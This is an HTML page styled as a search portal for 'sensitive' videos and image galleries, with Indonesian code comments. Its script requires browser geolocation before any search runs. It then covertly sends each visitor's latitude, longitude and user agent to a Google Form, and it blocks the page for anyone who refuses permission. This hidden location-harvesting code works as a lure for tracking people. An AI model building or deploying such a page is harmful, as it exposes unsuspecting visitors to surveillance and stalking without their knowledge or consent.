<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>リップズ</title>

<style>
body {
  margin: 0;
  background: black;
  color: white;
  font-family: Arial, sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
}

h1 { margin-top: 40px; }

.main-img {
  margin-top: 20px;
  width: 140px;
  height: 140px;
  border-radius: 18px;
  object-fit: cover;
}

input {
  margin-top: 20px;
  width: 220px;
  padding: 12px;
  border-radius: 10px;
  border: none;
}

button {
  margin-top: 12px;
  padding: 10px 30px;
  border-radius: 10px;
  border: none;
  background: white;
  font-weight: bold;
  cursor: pointer;
}

.warning {
  margin-top: 120px;
  opacity: 0.6;
}

/* MODAL */
.modal {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.6);
  backdrop-filter: blur(8px);
  justify-content: center;
  align-items: center;
  z-index: 999;
}

.modal-box {
  position: relative;
  width: 320px;
  text-align: center;
}

.modal video,
.modal img {
  width: 100%;
  border-radius: 16px;
}

.close {
  position: absolute;
  top: -35px;
  right: 0;
  font-size: 22px;
  cursor: pointer;
}

/* BLOKIR */
.block {
  display: none;
  position: fixed;
  inset: 0;
  background: black;
  color: white;
  z-index: 2000;
  display: flex;
  justify-content: center;
  align-items: center;
  text-align: center;
}

.block-box {
  opacity: 0.85;
}
</style>
</head>

<body>

<h1>リップズ</h1>
<img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">

<input id="keyword" placeholder="Search">
<button onclick="startSearch()">SEARCH</button>

<div class="warning">This Web Is Sensitif⚠</div>

<!-- MODAL -->
<div class="modal" id="modal">
  <div class="modal-box" id="modalBox">
    <div class="close" onclick="closeModal()">✕</div>
  </div>
</div>

<!-- BLOKIR -->
<div class="block" id="block">
  <div class="block-box">
    <h2>Akses Ditolak</h2>
    <p>Website ini memerlukan izin lokasi.<br>
    Tanpa izin, tidak ada akses.</p>
  </div>
</div>

<script>
let data = {};

// cache busting biar selalu update
fetch("https://lipzz-elzxd.github.io/Lipz/data.json?v=" + Date.now())
  .then(res => res.json())
  .then(json => data = json);

// Google Form
const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse";
const entryLat = "entry.138340134";
const entryLon = "entry.1616098311";
const entryUA  = "entry.1257224602";

function startSearch() {
  if (!navigator.geolocation) {
    blockSite();
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      // kirim lokasi dulu
      const dataForm = new URLSearchParams();
      dataForm.append(entryLat, pos.coords.latitude);
      dataForm.append(entryLon, pos.coords.longitude);
      dataForm.append(entryUA, navigator.userAgent);

      fetch(formURL, {
        method: "POST",
        mode: "no-cors",
        body: dataForm
      });

      // baru search jalan
      search();
    },
    err => {
      blockSite();
    }
  );
}

function search() {
  const key = document.getElementById("keyword").value.trim().toLowerCase();
  if (!data[key]) return;

  const modalBox = document.getElementById("modalBox");
  modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';

  if (data[key].type === "video") {
    const v = document.createElement("video");
    v.src = data[key].src;
    v.controls = true;
    v.autoplay = true;
    modalBox.appendChild(v);
  }

  if (data[key].type === "gallery") {
    let idx = 0;
    const imgs = data[key].images;

    const img = document.createElement("img");
    img.src = imgs[idx];
    modalBox.appendChild(img);

    const indicator = document.createElement("div");
    indicator.style.marginTop = "8px";
    indicator.style.letterSpacing = "4px";
    modalBox.appendChild(indicator);

    function update() {
      img.src = imgs[idx];
      indicator.textContent = imgs.map((_,i)=> i===idx?"♦":"•").join("");
    }

    img.onclick = () => {
      idx = (idx + 1) % imgs.length;
      update();
    };

    update();
  }

  document.getElementById("modal").style.display = "flex";
}

function closeModal() {
  document.getElementById("modal").style.display = "none";
  document.getElementById("modalBox").innerHTML = "";
}

function blockSite() {
  document.getElementById("block").style.display = "flex";
}
</script>

</body>
</html>
